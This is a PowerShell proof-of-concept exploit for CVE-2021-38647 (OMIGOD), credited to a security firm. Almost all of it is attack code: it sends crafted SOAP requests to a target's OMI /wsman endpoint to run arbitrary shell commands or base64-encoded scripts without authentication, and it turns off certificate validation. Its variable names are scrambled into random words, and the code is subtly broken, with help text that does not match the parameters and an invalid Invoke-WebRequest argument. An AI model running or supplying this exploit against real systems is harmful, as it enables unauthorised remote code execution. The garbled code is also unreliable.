﻿Function Invoke-CVE-2021-38647
{
<#
    .SYNOPSIS

        CVE-2021-38647 - POC to exploit unauthenticated RCE #OMIGOD

    .DESCRIPTION

        Exploit CVE-2021-38647 (OMIGOD) on a remote machine and execute command

    .PARAMETER TargetIP

        Enter IP Address of the target machine.

    .PARAMETER TargetPort

        Enter Target Port number on which the OMI service is running.

    .PARAMETER Command

        Enter the command that needs to be executed on the target machine.

    .PARAMETER Script

        Enter the Base64 encoded commands that needs to be executed on the target machine. We can add multiple commands and encode it to base64 and execute all the commands at once.
    
    .EXAMPLE

        PS> Invoke-CVE-2021-38647 -KnottyChew 1.1.1.1 -WoodenTemper 5986 -PizzasWet id

    .EXAMPLE

        PS> $NearRoof = @"
            id
            whoami
            uname -a
            "@
        PS> $PunyBone = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($NearRoof))
        PS> Invoke-CVE-2021-38647 -KnottyChew 1.1.1.1 -WoodenTemper 5986 -DryPray $PunyBone

    .LINK

        https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure
        https://github.com/microsoft/omi
        https://github.com/microsoft/SCXcore

    .NOTES

        POC created based on the blog post published by WIZ team at 
        https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure

        Author: Chirag Savla (@chiragsavla94) of Altered Security Pte Ltd.

        Credit: WIZ Team (@wiz_io)

#>

    param (
            [string]$KnottyChew,
            [string]$WoodenTemper,
            [string]$PizzasWet,
            [string]$DryPray
    )

    Add-Type -AssemblyName System.Web
    $GazeAttach = [System.Web.HttpUtility]::HtmlEncode($PizzasWet)

    $ShapeAct = "https://$KnottyChew"+":"+"$WoodenTemper/wsman"

    $WanderUnruly = [XML]@"
    <s:Envelope
	xmlns:s="http://www.w3.org/2003/05/soap-envelope"
	xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
	xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"
	xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema"
	xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
	xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" >
	<s:Header>
		<a:To>HTTP://127.0.0.1:5986/wsman/</a:To>
		<w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
		<a:ReplyTo>
			<a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
		</a:ReplyTo>
		<a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
		<w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
		<a:MessageID>uuid:6B72D22C-CC07-0005-0000-000000010000</a:MessageID>
		<w:OperationTimeout>PT1M30S</w:OperationTimeout>
		<w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
		<p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
		<w:OptionSet s:mustUnderstand="true"></w:OptionSet>
		<w:SelectorSet>
			<w:Selector Name="__cimnamespace">root/scx</w:Selector>
		</w:SelectorSet>
	</s:Header>
	<s:Body>
		<p:ExecuteShellCommand_INPUT
			xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
			<p:command>$GazeAttach</p:command>
			<p:timeout>0</p:timeout>
		</p:ExecuteShellCommand_INPUT>
	</s:Body>
</s:Envelope>
"@

    $AdviseScrub = @"
    <s:Envelope
	xmlns:s="http://www.w3.org/2003/05/soap-envelope"
	xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
	xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"
	xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema"
	xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
	xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" >
	<s:Header>
		<a:To>HTTP://127.0.0.1:5986/wsman/</a:To>
		<w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
		<a:ReplyTo>
			<a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
		</a:ReplyTo>
		<a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action>
		<w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
		<a:MessageID>uuid:DFAB024A-CC2A-0005-0000-000000010000</a:MessageID>
		<w:OperationTimeout>PT1M30S</w:OperationTimeout>
		<w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
		<p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
		<w:OptionSet s:mustUnderstand="true"></w:OptionSet>
		<w:SelectorSet>
			<w:Selector Name="__cimnamespace">root/scx</w:Selector>
		</w:SelectorSet>
	</s:Header>
	<s:Body>
		<p:ExecuteScript_INPUT
			xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
			<p:Script>$DryPray</p:Script>
			<p:Arguments></p:Arguments>
			<p:timeout>0</p:timeout>
			<p:b64encoded>true</p:b64encoded>
		</p:ExecuteScript_INPUT>
	</s:Body>
</s:Envelope>
"@

    $BusyPlucky = @{
        "Content-Type" = "application/soap+xml;charset=UTF-8"
    }

    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    if($PizzasWet)
    {
        [xml]$BrassTooth = (Invoke-WebRequest -Uri $ShapeAct -WanderUnruly $WanderUnruly -Headers $BusyPlucky -Method Post).Content
    }
    elseif($DryPray)
    {
        [xml]$BrassTooth = (Invoke-WebRequest -Uri $ShapeAct -WanderUnruly $AdviseScrub -Headers $BusyPlucky -Method Post).Content
    }
    else
    {
        Write-Output "Please pass `$PizzasWet or `$DryPray argument."
    }

    if($BrassTooth)
    {
        if($BrassTooth.Envelope.Body.ChildNodes.ReturnCode -eq 0)
        {
            Write-Output $BrassTooth.Envelope.Body.ChildNodes.StdOut
        }
        else
        {
            Write-Output $BrassTooth.Envelope.Body.ChildNodes.StdErr
        }
    }
}
